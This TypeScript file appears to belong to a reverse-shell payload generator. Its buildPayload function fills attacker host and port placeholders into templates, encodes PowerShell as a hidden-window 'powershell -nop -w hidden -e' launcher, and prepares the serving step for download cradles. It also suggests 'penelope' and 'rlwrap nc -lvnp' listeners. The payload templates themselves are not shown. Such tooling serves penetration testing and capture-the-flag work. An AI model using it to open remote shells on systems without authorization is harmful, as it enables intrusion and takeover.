import { utf16leBase64 } from "./encode";
import { wrapForContext, type PasteContext } from "./context";
import type { BuiltPayload, PayloadDef } from "./types";

const PLACEHOLDER = /\{([A-Z][A-Z0-9_]*)\}/g;
const FALLBACK_LISTENER = "rlwrap nc -lvnp";
/** The web server for a served file: 80, or 8000 when the listener takes 80, so the two never clash. */
const ALT_SERVE_PORT = "8000";

/**
 * Tokens worked out from the others, never typed and never unresolved: SERVE_PORT (the web server's port) and
 * WEB_PORT (":8000" in the cradle URL when the server moved off 80, else nothing).
 */
export const DERIVED_TOKENS = new Set(["SERVE_PORT", "WEB_PORT"]);

/** Fills the placeholders and wraps the result so it works as pasted in `ctx`. */
export function buildPayload(def: PayloadDef, ctx: PasteContext, values: Record<string, string>): BuiltPayload {
  const unresolved: string[] = [];
  const value = (name: string): string | null => {
    const given = (values[name] ?? "").trim();
    const v = given !== "" ? given : (def.defaults?.[name] ?? "").trim();
    return v === "" ? null : v;
  };
  const moved = value("LPORT") === "80";
  const derived: Record<string, string> = { SERVE_PORT: moved ? ALT_SERVE_PORT : "80", WEB_PORT: moved ? `:${ALT_SERVE_PORT}` : "" };
  const fill = (template: string) => template.replace(PLACEHOLDER, (m, name: string) => {
    if (DERIVED_TOKENS.has(name)) return derived[name]!;
    const v = value(name);
    if (v === null) {
      if (!unresolved.includes(name)) unresolved.push(name);
      return m;
    }
    return v;
  });
  const filled = fill(def.template);
  const prepareLines = [def.prepare, def.serve].filter((l): l is string => !!l).map(fill);
  const prepare = prepareLines.length > 0 ? prepareLines.join("\n") : null;

  const notes: string[] = [...(def.notes ?? [])];
  let text: string;
  if (unresolved.length > 0) {
    // Keep the placeholder visible; encoding or wrapping it would hide the gap.
    text = def.encodePowerShell
      ? `powershell -nop -w hidden -e <UTF-16LE base64 of the script, once ${unresolved.map((n) => `{${n}}`).join(" ")} is set>`
      : filled;
    notes.push(`Set ${unresolved.join(", ")} first: the payload is not wrapped for ${ctx} until it is.`);
  } else {
    const raw = def.encodePowerShell ? `powershell -nop -w hidden -e ${utf16leBase64(filled)}` : filled;
    const wrapped = wrapForContext(raw, ctx, def.os);
    text = wrapped.text;
    notes.push(...wrapped.notes);
  }
  if (def.bakesIp) notes.push("LHOST and LPORT are baked into the served script: regenerate it if either changes.");

  const port = value("LPORT") ?? "{LPORT}";
  let listener: string | null = null;
  if (def.listener === "penelope") {
    listener = `penelope -O -p ${port}`;
    notes.push(`No penelope? ${FALLBACK_LISTENER} ${port}`);
  }
  return { def, text, listener, parts: def.parts, notes, unresolved, prepare };
}
